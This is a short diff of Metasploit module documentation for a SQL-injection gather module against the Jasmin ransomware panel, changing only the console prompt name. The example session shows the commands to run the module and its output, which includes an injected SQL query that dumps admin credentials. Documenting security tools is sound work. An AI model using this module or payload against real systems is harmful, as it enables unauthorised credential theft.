@@ -56,14 +56,14 @@ Number of rows from the victim table to pull. Defaults to `nil` which pulls all 
 ### Jasmin installed on Ubuntu 22.04
 
 ```
-msf6 > use auxiliary/gather/jasmin_ransomware_sqli
-msf6 auxiliary(gather/jasmin_ransomware_sqli) > set verbose true
+msf > use auxiliary/gather/jasmin_ransomware_sqli
+msf auxiliary(gather/jasmin_ransomware_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(gather/jasmin_ransomware_sqli) > set rhosts 127.0.0.1
+msf auxiliary(gather/jasmin_ransomware_sqli) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(gather/jasmin_ransomware_sqli) > set victims true
+msf auxiliary(gather/jasmin_ransomware_sqli) > set victims true
 victims => true
-msf6 auxiliary(gather/jasmin_ransomware_sqli) > run
+msf auxiliary(gather/jasmin_ransomware_sqli) > run
 
 [*] Dumping login table
 [*] {SQLi} Executing (select group_concat(cast(concat_ws(';',ifnull(admin,''),ifnull(creds,'')) as binary)) from master)
